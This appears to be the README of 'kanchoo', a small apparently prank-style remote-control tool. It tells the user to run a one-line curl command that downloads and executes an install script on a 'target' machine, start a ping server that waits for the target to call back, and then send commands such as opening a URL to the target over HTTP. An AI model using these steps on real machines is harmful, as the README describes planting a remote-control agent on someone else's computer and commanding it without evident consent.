# kanchoo
カンチョー

## how to

#### 1. install in the target (wip)
```sh
ip=127.0.0.1 /bin/zsh <(curl -fsSL https://raw.githubusercontent.com/davidegaspar/kanchoo/wip/install)
```

#### 2. start ping server and wait for target to ping back
```sh
./ping.js
```

#### 3. once you have the target details run a story or a single action
```sh
./story <storyName>.json <ip>
```
```sh
curl -H "Content-Type: application/json" -X POST -d '{"openUrl":"example.com"}' http://${ip}:12121
```

## dependencies
- nodejs
- zsh
